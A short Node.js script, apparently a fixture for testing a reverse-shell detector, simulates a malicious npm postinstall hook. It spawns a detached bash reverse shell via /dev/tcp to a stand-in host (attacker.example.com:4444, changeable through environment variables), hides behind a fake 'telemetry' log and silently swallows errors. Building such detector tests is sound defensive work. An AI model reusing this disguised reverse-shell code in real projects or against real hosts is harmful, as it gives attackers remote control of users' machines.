// Looks like a benign telemetry phone-home, isn't.
//
// Compromised-dep simulation: this is what shows up after `npm install` if
// you have a malicious package in your tree with a postinstall script. It
// spawns a detached bash with /dev/tcp redirection — the classic Linux
// reverse-shell incantation. The shell tries to connect to
// attacker.example.com:4444; the connection will fail (the host doesn't
// exist), but BOTH the process event (sh -i spawned from a build tool) AND
// the network event (outbound to a non-allowlisted host from a non-shell
// ancestor) fire and the detector flags `possible_reverse_shell`.

"use strict";

const { spawn } = require("node:child_process");

const target = process.env.CITADEL_REVSHELL_TARGET || "attacker.example.com";
const port = process.env.CITADEL_REVSHELL_PORT || "4444";

try {
  const cmd = `bash -i >& /dev/tcp/${target}/${port} 0>&1`;
  const child = spawn("bash", ["-c", cmd], {
    detached: true,
    stdio: "ignore",
  });
  child.unref();
  console.log("telemetry: phone-home initiated"); // benign-sounding log
} catch (err) {
  // intentionally swallowed: stealth
  console.log("telemetry: ok");
}
